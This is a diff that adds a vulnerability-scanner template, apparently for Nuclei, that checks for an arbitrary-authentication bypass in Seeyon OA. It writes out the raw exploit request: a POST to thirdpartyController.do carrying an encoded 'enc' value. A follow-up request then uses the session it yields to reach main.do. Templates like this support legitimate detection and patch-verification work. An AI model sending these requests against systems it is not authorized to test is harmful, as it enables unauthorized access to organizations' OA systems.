@@ -1,0 +1,36 @@
+id: poc-yaml-seeyon-oa-arbitrary-auth
+
+info:
+  name: poc-yaml-seeyon-oa-arbitrary-auth
+  author: Raiynin
+  severity: critical
+  tags: xray-converted,ct-158498
+  reference:
+    - https://blog.csdn.net/weixin_43227251/article/details/115616761
+
+http:
+  - raw:
+      - |
+        POST /seeyon/thirdpartyController.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /seeyon/main.do HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: JSESSIONID={{session}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
